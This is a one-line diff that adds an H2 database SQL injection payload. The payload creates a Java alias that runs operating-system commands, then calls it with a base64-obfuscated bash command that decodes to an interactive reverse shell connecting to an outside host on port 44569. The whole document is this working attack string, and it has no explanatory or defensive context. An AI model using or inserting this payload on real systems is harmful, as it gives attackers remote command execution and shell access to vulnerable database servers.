@@ -1,0 +1,1 @@
+CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd);return "123";}';CALL EXEC ('bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9zZXJ2ZXIubmF0YXBwZnJlZS5jYy80NDU2OSAwPiYx}|{base64,-d}|{bash,-i}')
